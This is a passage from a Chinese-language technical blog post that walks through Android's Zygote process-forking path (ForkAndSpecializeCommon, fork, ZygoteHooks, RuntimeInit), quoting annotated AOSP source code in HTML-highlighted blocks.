<span class="hljs-comment">//设置子进程的signal信号处理函数</span><br>  <span class="hljs-built_in">SetSigChldHandler</span>();<br>  <span class="hljs-comment">//fork子进程 </span><br>  <span class="hljs-keyword">pid_t</span> pid = fork();<br>  <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">//进入子进程</span><br>    <span class="hljs-built_in">DetachDescriptors</span>(env, fdsToClose); <span class="hljs-comment">//关闭并清除文件描述符</span><br><br>    <span class="hljs-keyword">if</span> (!is_system_server) &#123;<br>        <span class="hljs-comment">//对于非system_server子进程，则创建进程组</span><br>        <span class="hljs-keyword">int</span> rc = <span class="hljs-built_in">createProcessGroup</span>(uid, <span class="hljs-built_in">getpid</span>());<br>    &#125;<br>    <span class="hljs-built_in">SetGids</span>(env, javaGids); <span class="hljs-comment">//设置设置group</span><br>    <span class="hljs-built_in">SetRLimits</span>(env, javaRlimits); <span class="hljs-comment">//设置资源limit</span><br><br>    <span class="hljs-keyword">int</span> rc = <span class="hljs-built_in">setresgid</span>(gid, gid, gid);<br>    rc = <span class="hljs-built_in">setresuid</span>(uid, uid, uid);<br><br>    <span class="hljs-built_in">SetCapabilities</span>(env, permittedCapabilities, effectiveCapabilities);<br>    <span class="hljs-built_in">SetSchedulerPolicy</span>(env); <span class="hljs-comment">//设置调度策略</span><br><br>     <span class="hljs-comment">//selinux上下文</span><br>    rc = <span class="hljs-built_in">selinux_android_setcontext</span>(uid, is_system_server, se_info_c_str, se_name_c_str);<br><br>    <span class="hljs-keyword">if</span> (se_info_c_str == <span class="hljs-literal">NULL</span> &amp;&amp; is_system_server) &#123;<br>      se_name_c_str = <span class="hljs-string">&quot;system_server&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (se_info_c_str != <span class="hljs-literal">NULL</span>) &#123;<br>      <span class="hljs-built_in">SetThreadName</span>(se_name_c_str); <span class="hljs-comment">//设置线程名为，方便调试</span><br>    &#125;<br>    <span class="hljs-comment">//在Zygote子进程中，设置信号SIGCHLD的处理器恢复为默认行为</span><br>    <span class="hljs-built_in">UnsetSigChldHandler</span>();<br>    <span class="hljs-comment">//等价于调用zygote.callPostForkChildHooks() </span><br>    env-&gt;<span class="hljs-built_in">CallStaticVoidMethod</span>(gZygoteClass, gCallPostForkChildHooks, debug_flags,<br>                              is_system_server ? <span class="hljs-literal">NULL</span> : instructionSet);<br>    ...<br><br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid &gt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-comment">//进入父进程，即Zygote进程</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> pid;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里会通过fork()方法创建进程</p><h4 id="3-4-8-fork-fork"><a href="#3-4-8-fork-fork" class="headerlink" title="3.4.8 fork.fork()"></a>3.4.8 fork.fork()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">int</span> fork() &#123;<br>  __bionic_atfork_run_prepare(); <span class="hljs-comment">// fork完成前，父进程回调方法</span><br><br>  pthread_internal_t* <span class="hljs-built_in">self</span> = __get_thread();<br><br>  <span class="hljs-comment">//fork期间，获取父进程pid，并使其缓存值无效</span><br>  pid_t parent_pid = <span class="hljs-built_in">self</span>-&gt;invalidate_cached_pid();<br>  <span class="hljs-comment">//系统调用</span><br>  <span class="hljs-keyword">int</span> result = syscall(__NR_clone, FORK_FLAGS, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;(<span class="hljs-built_in">self</span>-&gt;tid));<br>  <span class="hljs-keyword">if</span> (result == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-built_in">self</span>-&gt;set_cached_pid(gettid());<br>    __bionic_atfork_run_child(); <span class="hljs-comment">//fork完成执行子进程回调方法</span><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">self</span>-&gt;set_cached_pid(parent_pid);<br>    __bionic_atfork_run_parent(); <span class="hljs-comment">//fork完成执行父进程回调方法</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>fork进程结束后会在ForkAndSpecializeCommon函数中调用CallStaticVoidMethod。这就是反射调用zygote.callPostForkChildHooks()</p><h4 id="3-4-9-zygote-callPostForkChildHooks"><a href="#3-4-9-zygote-callPostForkChildHooks" class="headerlink" title="3.4.9 zygote.callPostForkChildHooks()"></a>3.4.9 zygote.callPostForkChildHooks()</h4><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">callPostForkChildHooks</span><span class="hljs-params">(<span class="hljs-keyword">int</span> debugFlags, <span class="hljs-keyword">boolean</span> isSystemServer,</span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-keyword">String</span> instructionSet)</span> </span>&#123;<br>        VM_HOOKS.<span class="hljs-built_in">postForkChild</span>(debugFlags, isSystemServer, instructionSet);<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="3-4-10-ZygoteHooks-postForkChild"><a href="#3-4-10-ZygoteHooks-postForkChild" class="headerlink" title="3.4.10 ZygoteHooks.postForkChild()"></a>3.4.10 ZygoteHooks.postForkChild()</h4><p>源码位于libcore/dalvik/src/main/java/dalvik/system/ZygoteHooks.java</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">public void post<span class="hljs-constructor">ForkChild(<span class="hljs-params">int</span> <span class="hljs-params">debugFlags</span>, String <span class="hljs-params">instructionSet</span>)</span> &#123;<br>    native<span class="hljs-constructor">PostForkChild(<span class="hljs-params">token</span>, <span class="hljs-params">debugFlags</span>, <span class="hljs-params">instructionSet</span>)</span>;<br>    <span class="hljs-comment">//将当前时间设置为新进程随机数种子</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Math</span>.</span></span>set<span class="hljs-constructor">RandomSeedInternal(System.<span class="hljs-params">currentTimeMillis</span>()</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>nativePostForkChild又通过jni调用dalvik_system_ZygoteHooks.ZygoteHooks_nativePostForkChild方法</p><h4 id="3-4-11-dalvik-system-ZygoteHooks-ZygoteHooks-nativePostForkChild"><a href="#3-4-11-dalvik-system-ZygoteHooks-ZygoteHooks-nativePostForkChild" class="headerlink" title="3.4.11 dalvik_system_ZygoteHooks.ZygoteHooks_nativePostForkChild()"></a>3.4.11 dalvik_system_ZygoteHooks.ZygoteHooks_nativePostForkChild()</h4><p>源码位于art/runtime/native/dalvik_system_ZygoteHooks.cc</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">ZygoteHooks_nativePostForkChild</span><span class="hljs-params">(JNIEnv* env,</span></span><br><span class="hljs-params"><span class="hljs-function">                                            jclass,</span></span><br><span class="hljs-params"><span class="hljs-function">                                            jlong token,</span></span><br><span class="hljs-params"><span class="hljs-function">                                            jint debug_flags,</span></span><br><span class="hljs-params"><span class="hljs-function">                                            jboolean is_system_server,</span></span><br><span class="hljs-params"><span class="hljs-function">                                            jstring instruction_set)</span> </span>&#123;<br>                                <br>                                <br>  <span class="hljs-comment">//此处token是由nativePreFork()创建的，记录着当前线程</span><br>  Thread* thread = <span class="hljs-keyword">reinterpret_cast</span>&lt;Thread*&gt;(token);<br>  <span class="hljs-comment">// Our system thread ID, etc, has changed so reset Thread state.</span><br>  <span class="hljs-comment">//设置新进程的主线程id</span><br>  thread-&gt;<span class="hljs-built_in">InitAfterFork</span>();<br>  <span class="hljs-built_in">EnableDebugFeatures</span>(debug_flags);<br><br>  <span class="hljs-comment">// Update tracing.</span><br>  <span class="hljs-keyword">if</span> (Trace::<span class="hljs-built_in">GetMethodTracingMode</span>() != TracingMode::kTracingInactive) &#123;<br>    Trace::TraceOutputMode output_mode = Trace::<span class="hljs-built_in">GetOutputMode</span>();<br>    Trace::TraceMode trace_mode = Trace::<span class="hljs-built_in">GetMode</span>();<br>    <span class="hljs-keyword">size_t</span> buffer_size = Trace::<span class="hljs-built_in">GetBufferSize</span>();<br><br>    <span class="hljs-comment">// Just drop it.</span><br>    Trace::<span class="hljs-built_in">Abort</span>();<br><br>    <span class="hljs-comment">// Only restart if it was streaming mode.</span><br>    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Expose buffer size, so we can also do file mode.</span><br>    <span class="hljs-keyword">if</span> (output_mode == Trace::TraceOutputMode::kStreaming) &#123;<br>      <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* proc_name_cutils = <span class="hljs-built_in">get_process_name</span>();<br>      std::string proc_name;<br>      <span class="hljs-keyword">if</span> (proc_name_cutils != <span class="hljs-literal">nullptr</span>) &#123;<br>        proc_name = proc_name_cutils;<br>      &#125;<br>      <span class="hljs-keyword">if</span> (proc_name_cutils == <span class="hljs-literal">nullptr</span> || proc_name == <span class="hljs-string">&quot;zygote&quot;</span> || proc_name == <span class="hljs-string">&quot;zygote64&quot;</span>) &#123;<br>        <span class="hljs-comment">// Either no process name, or the name hasn&#x27;t been changed, yet. Just use pid.</span><br>        <span class="hljs-keyword">pid_t</span> pid = <span class="hljs-built_in">getpid</span>();<br>        proc_name = <span class="hljs-built_in">StringPrintf</span>(<span class="hljs-string">&quot;%u&quot;</span>, <span class="hljs-keyword">static_cast</span>&lt;<span class="hljs-keyword">uint32_t</span>&gt;(pid));<br>      &#125;<br><br>      std::string trace_file = <span class="hljs-built_in">StringPrintf</span>(<span class="hljs-string">&quot;/data/misc/trace/%s.trace.bin&quot;</span>, proc_name.<span class="hljs-built_in">c_str</span>());<br>      Trace::<span class="hljs-built_in">Start</span>(trace_file.<span class="hljs-built_in">c_str</span>(),<br>                   <span class="hljs-number">-1</span>,<br>                   buffer_size,<br>                   <span class="hljs-number">0</span>,   <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Expose flags.</span><br>                   output_mode,<br>                   trace_mode,<br>                   <span class="hljs-number">0</span>);  <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Expose interval.</span><br>      <span class="hljs-keyword">if</span> (thread-&gt;<span class="hljs-built_in">IsExceptionPending</span>()) &#123;<br>        <span class="hljs-function">ScopedObjectAccess <span class="hljs-title">soa</span><span class="hljs-params">(env)</span></span>;<br>        thread-&gt;<span class="hljs-built_in">ClearException</span>();<br>      &#125;<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (instruction_set != <span class="hljs-literal">nullptr</span> &amp;&amp; !is_system_server) &#123;<br>    <span class="hljs-function">ScopedUtfChars <span class="hljs-title">isa_string</span><span class="hljs-params">(env, instruction_set)</span></span>;<br>    InstructionSet isa = <span class="hljs-built_in">GetInstructionSetFromString</span>(isa_string.<span class="hljs-built_in">c_str</span>());<br>    Runtime::NativeBridgeAction action = Runtime::NativeBridgeAction::kUnload;<br>    <span class="hljs-keyword">if</span> (isa != kNone &amp;&amp; isa != kRuntimeISA) &#123;<br>      action = Runtime::NativeBridgeAction::kInitialize;<br>    &#125;<br>    Runtime::<span class="hljs-built_in">Current</span>()-&gt;<span class="hljs-built_in">InitNonZygoteOrPostFork</span>(<br>        env, is_system_server, action, isa_string.<span class="hljs-built_in">c_str</span>());<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    Runtime::<span class="hljs-built_in">Current</span>()-&gt;<span class="hljs-built_in">InitNonZygoteOrPostFork</span>(<br>        env, is_system_server, Runtime::NativeBridgeAction::kUnload, <span class="hljs-literal">nullptr</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="3-4-12-Runtime-InitNonZygoteOrPostFork"><a href="#3-4-12-Runtime-InitNonZygoteOrPostFork" class="headerlink" title="3.4.12 Runtime::InitNonZygoteOrPostFork()"></a>3.4.12 Runtime::InitNonZygoteOrPostFork()</h4><p>源码位于art/runtime/runtime.cc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">void</span> Runtime::InitNonZygoteOrPostFork(<br>    JNIEnv* env, <span class="hljs-keyword">bool</span> is_system_server, NativeBridgeAction action, <span class="hljs-keyword">const</span> char* isa) &#123;<br>  is_zygote_ = <span class="hljs-literal">false</span>;<br><br>  <span class="hljs-keyword">if</span> (is_native_bridge_loaded_) &#123;<br>    <span class="hljs-keyword">switch</span> (action) &#123;<br>      <span class="hljs-keyword">case</span> NativeBridgeAction::kUnload:<br>        <span class="hljs-comment">//卸载用于跨平台的桥连库</span><br>        UnloadNativeBridge(); <br>        is_native_bridge_loaded_ = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">break</span>;<br><br>      <span class="hljs-keyword">case</span> NativeBridgeAction::kInitialize:<br>        InitializeNativeBridge(env, isa);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-comment">// Create the thread pools.</span><br>  <span class="hljs-comment">//创建Java堆处理的线程池</span><br>  heap_-&gt;CreateThreadPool();<br>  <span class="hljs-comment">// Reset the gc performance data at zygote fork so that the GCs</span><br>  <span class="hljs-comment">// before fork aren&#x27;t attributed to an app.</span><br>  <span class="hljs-comment">//重置gc性能数据，以保证进程在创建之前的GCs不会计算到当前app上。</span><br>  heap_-&gt;ResetGcPerformanceInfo();<br><br><br>  <span class="hljs-keyword">if</span> (!is_system_server &amp;&amp;<br>      !safe_mode_ &amp;&amp;<br>      (jit_options_-&gt;UseJitCompilation() || jit_options_-&gt;GetSaveProfilingInfo()) &amp;&amp;<br>      jit_.get() == nullptr) &#123;<br>    <span class="hljs-comment">// Note that when running ART standalone (not zygote, nor zygote fork),</span><br>    <span class="hljs-comment">// the jit may have already been created.</span><br>    <span class="hljs-comment">//当flag被设置，并且还没有创建JIT时，则创建JIT</span><br>    CreateJit();<br>  &#125;<br>  <span class="hljs-comment">//设置信号处理函数</span><br>  StartSignalCatcher();<br><br>  <span class="hljs-comment">// Start the JDWP thread. If the command-line debugger flags specified &quot;suspend=y&quot;,</span><br>  <span class="hljs-comment">// this will pause the runtime, so we probably want this to come last.</span><br>  <span class="hljs-comment">//启动JDWP线程，当命令debuger的flags指定&quot;suspend=y&quot;时，则暂停runtime</span><br>  Dbg::StartJdwp();<br>&#125;<br></code></pre></td></tr></table></figure><p>fork完成后继续Zygote.forkAndSpecialize方法第三步</p><h4 id="3-4-12-ZygoteHooks-postForkCommon"><a href="#3-4-12-ZygoteHooks-postForkCommon" class="headerlink" title="3.4.12  ZygoteHooks.postForkCommon()"></a>3.4.12  ZygoteHooks.postForkCommon()</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">public void post<span class="hljs-constructor">ForkCommon()</span> &#123;<br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Daemons</span>.</span></span>start<span class="hljs-literal">()</span>;<br>&#125;<br><br>public static void start<span class="hljs-literal">()</span> &#123;<br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ReferenceQueueDaemon</span>.</span><span class="hljs-module"><span class="hljs-identifier">INSTANCE</span>.</span></span>start<span class="hljs-literal">()</span>;<br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">FinalizerDaemon</span>.</span><span class="hljs-module"><span class="hljs-identifier">INSTANCE</span>.</span></span>start<span class="hljs-literal">()</span>;<br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">FinalizerWatchdogDaemon</span>.</span><span class="hljs-module"><span class="hljs-identifier">INSTANCE</span>.</span></span>start<span class="hljs-literal">()</span>;<br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HeapTaskDaemon</span>.</span><span class="hljs-module"><span class="hljs-identifier">INSTANCE</span>.</span></span>start<span class="hljs-literal">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>主要作用是在fork新进程后将之前停掉的四个Daemon线程启动起来</p><p>forkAndSpecialize 总结</p><ul><li>preFork：停止4个Daemon子线程，初始化GC</li><li>nativeForkAndSpecialize：调用Linux的fork()子进程，设置新进程的主线程id，重置gc性能数据，设置信号处理函数等功能</li><li>postForkCommon：重新启动四个daemon子线程</li><li>forkAndSpecialize执行结束，即创建新进程后，会有两次返回，第一次回到ZygoteConnection.runOnce方法，执行子进程handleChildProc方法；第二次回到该方法，执行zygote进程的handleParentProc方法</li></ul><h4 id="3-4-13-回调子进程ZygoteConnection-handleChildProc"><a href="#3-4-13-回调子进程ZygoteConnection-handleChildProc" class="headerlink" title="3.4.13 回调子进程ZygoteConnection.handleChildProc()"></a>3.4.13 回调子进程ZygoteConnection.handleChildProc()</h4><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 处理子进程的post-fork设置，并根据需要关闭套接字，根据需要重新打开stdio，</span><br><span class="hljs-comment">     * 如果成功则最终抛出MethodAndArgsCaller，如果失败则返回。</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> void handleChildProc(Arguments parsedArgs,<br>            FileDescriptor[] descriptors, FileDescriptor pipeFd, PrintStream <span class="hljs-keyword">new</span><span class="hljs-type">Stderr</span>)<br>            throws ZygoteInit.MethodAndArgsCaller &#123;<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 当执行到达这里时，native code关闭了两个实际的Zygote socket连接，</span><br><span class="hljs-comment">         * 并在它们的位置替换了/ dev / null。 LocalSocket对象仍需要正确关闭。</span><br><span class="hljs-comment">         */</span><br><br>        closeSocket();<br>        ZygoteInit.closeServerSocket();<br><br>        <span class="hljs-keyword">if</span> (descriptors != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Os.dup2(descriptors[<span class="hljs-number">0</span>], STDIN_FILENO);<br>                Os.dup2(descriptors[<span class="hljs-number">1</span>], STDOUT_FILENO);<br>                Os.dup2(descriptors[<span class="hljs-number">2</span>], STDERR_FILENO);<br><br>                <span class="hljs-keyword">for</span> (FileDescriptor fd: <span class="hljs-type">descriptors</span>) &#123;<br>                    IoUtils.closeQuietly(fd);<br>                &#125;<br>                <span class="hljs-keyword">new</span><span class="hljs-type">Stderr</span> = System.err;<br>            &#125; <span class="hljs-keyword">catch</span> (ErrnoException ex) &#123;<br>                Log.e(TAG, <span class="hljs-string">&quot;Error reopening stdio&quot;</span>, ex);<br>            &#125;<br>        &#125;<br><br> <span class="hljs-comment">//设置进程名</span><br>        <span class="hljs-keyword">if</span> (parsedArgs.niceName != <span class="hljs-literal">null</span>) &#123;<br>            Process.setArgV0(parsedArgs.niceName);<br>        &#125;<br><br><br>        <span class="hljs-keyword">if</span> (parsedArgs.invokeWith != <span class="hljs-literal">null</span>) &#123;<br>            WrapperInit.execApplication(parsedArgs.invokeWith,<br>                    parsedArgs.niceName, parsedArgs.targetSdkVersion,<br>                    VMRuntime.getCurrentInstructionSet(),<br>                    pipeFd, parsedArgs.remainingArgs);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            RuntimeInit.zygoteInit(parsedArgs.targetSdkVersion,<br>                    parsedArgs.remainingArgs, <span class="hljs-literal">null</span> <span class="hljs-comment">/* classLoader */</span>);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="3-4-14-RuntimeInit-zygoteInit"><a href="#3-4-14-RuntimeInit-zygoteInit" class="headerlink" title="3.4.14 RuntimeInit.zygoteInit()"></a>3.4.14 RuntimeInit.zygoteInit()</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">public static final void zygote<span class="hljs-constructor">Init(<span class="hljs-params">int</span> <span class="hljs-params">targetSdkVersion</span>, String[] <span class="hljs-params">argv</span>, ClassLoader <span class="hljs-params">classLoader</span>)</span><br>        throws ZygoteInit.MethodAndArgsCaller &#123;<br><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Trace</span>.</span></span>trace<span class="hljs-constructor">Begin(Trace.TRACE_TAG_ACTIVITY_MANAGER, <span class="hljs-string">&quot;RuntimeInit&quot;</span>)</span>;<br>    redirect<span class="hljs-constructor">LogStreams()</span>; <span class="hljs-comment">//重定向log输出</span><br><br>    common<span class="hljs-constructor">Init()</span>; <span class="hljs-comment">// 通用的一些初始化</span><br>    native<span class="hljs-constructor">ZygoteInit()</span>; <span class="hljs-comment">// zygote初始化 </span><br>    application<span class="hljs-constructor">Init(<span class="hljs-params">targetSdkVersion</span>, <span class="hljs-params">argv</span>, <span class="hljs-params">classLoader</span>)</span>; <span class="hljs-comment">// 应用初始化</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="3-4-15-RuntimeInit-commonInit"><a href="#3-4-15-RuntimeInit-commonInit" class="headerlink" title="3.4.15  RuntimeInit.commonInit()"></a>3.4.15  RuntimeInit.commonInit()</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">private</span> static final void common<span class="hljs-constructor">Init()</span> &#123;<br>    <span class="hljs-comment">// 设置默认的未捕捉异常处理方法</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Thread</span>.</span></span>set<span class="hljs-constructor">DefaultUncaughtExceptionHandler(<span class="hljs-params">new</span> UncaughtHandler()</span>);<br><br>    <span class="hljs-comment">// 设置市区，中国时区为&quot;Asia/Shanghai&quot;</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TimezoneGetter</span>.</span></span>set<span class="hljs-constructor">Instance(<span class="hljs-params">new</span> TimezoneGetter()</span> &#123;<br>        @Override<br>        public String get<span class="hljs-constructor">Id()</span> &#123;<br>            return <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SystemProperties</span>.</span></span>get(<span class="hljs-string">&quot;persist.sys.timezone&quot;</span>);<br>        &#125;<br>    &#125;);<br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TimeZone</span>.</span></span>set<span class="hljs-constructor">Default(<span class="hljs-params">null</span>)</span>;<br><br>    <span class="hljs-comment">//重置log配置</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LogManager</span>.</span></span>get<span class="hljs-constructor">LogManager()</span>.reset<span class="hljs-literal">()</span>;<br>    <span class="hljs-keyword">new</span> <span class="hljs-constructor">AndroidConfig()</span>;<br><br>    <span class="hljs-comment">// 设置默认的HTTP User-agent格式( &quot;Dalvik/1.1.0 (Linux; U; Android 6.0.1；LenovoX3c70 Build/LMY47V)&quot;),用于 HttpURLConnection</span><br>    String userAgent = get<span class="hljs-constructor">DefaultUserAgent()</span>;<br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>set<span class="hljs-constructor">Property(<span class="hljs-string">&quot;http.agent&quot;</span>, <span class="hljs-params">userAgent</span>)</span>;<br><br>    <span class="hljs-comment">// 设置socket的tag，用于网络流量统计</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">NetworkManagementSocketTagger</span>.</span></span>install<span class="hljs-literal">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="3-4-16-RuntimeInit-nativeZygoteInit"><a href="#3-4-16-RuntimeInit-nativeZygoteInit" class="headerlink" title="3.4.16 RuntimeInit.nativeZygoteInit()"></a>3.4.16 RuntimeInit.nativeZygoteInit()</h4><p>nativeZygoteInit()所对应的jni方法如下,源码位于frameworks/base/core/jni/AndroidRuntime.cpp</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">static void com<span class="hljs-constructor">_android_internal_os_RuntimeInit_nativeZygoteInit(JNIEnv<span class="hljs-operator">*</span> <span class="hljs-params">env</span>, <span class="hljs-params">jobject</span> <span class="hljs-params">clazz</span>)</span><br>&#123;<br>    <span class="hljs-comment">//此处的gCurRuntime为AppRuntime，是在AndroidRuntime.cpp中定义的</span><br>    gCurRuntime-&gt;on<span class="hljs-constructor">ZygoteInit()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="3-4-17-app-main-onZygoteInit"><a href="#3-4-17-app-main-onZygoteInit" class="headerlink" title="3.4.17 